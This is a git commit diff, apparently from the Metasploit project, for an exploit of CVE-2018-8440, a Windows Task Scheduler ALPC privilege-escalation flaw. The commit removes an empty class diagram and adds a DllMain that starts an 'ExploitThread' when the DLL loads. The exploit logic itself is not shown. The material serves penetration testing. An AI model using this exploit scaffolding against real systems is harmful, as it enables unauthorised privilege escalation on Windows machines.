83af598e6aa8fbfb6307afa64f6a856b18c45727
Jacob Robles <jrobles@rapid7.com>
2018-09-17 17:38:19 -0500

    Updated VS solution and module

--- external/source/exploits/CVE-2018-8440/ALPC-TaskSched-LPE/ClassDiagram.cd
+++
@@ -1,2 +0,0 @@
-﻿<?xml version="1.0" encoding="utf-8"?>
-<ClassDiagram /> 
---
+++ external/source/exploits/CVE-2018-8440/dll/ALPC-TaskSched-LPE/dllmain.cpp
@@ -0,0 +1,23 @@
+// dllmain.cpp : Defines the entry point for the DLL application.
+#include "stdafx.h"
+
+DWORD CALLBACK ExploitThread(LPVOID hModule);
+
+BOOL APIENTRY DllMain(HMODULE hModule,
+	DWORD  ul_reason_for_call,
+	LPVOID lpReserved
+)
+{
+	switch (ul_reason_for_call)
+	{
+	case DLL_PROCESS_ATTACH:
+		CreateThread(NULL, 0, ExploitThread, hModule, 0, NULL);
+		break;
+	case DLL_THREAD_ATTACH:
+	case DLL_THREAD_DETACH:
+	case DLL_PROCESS_DETACH:
+		break;
+	}
+	return TRUE;
+}
+
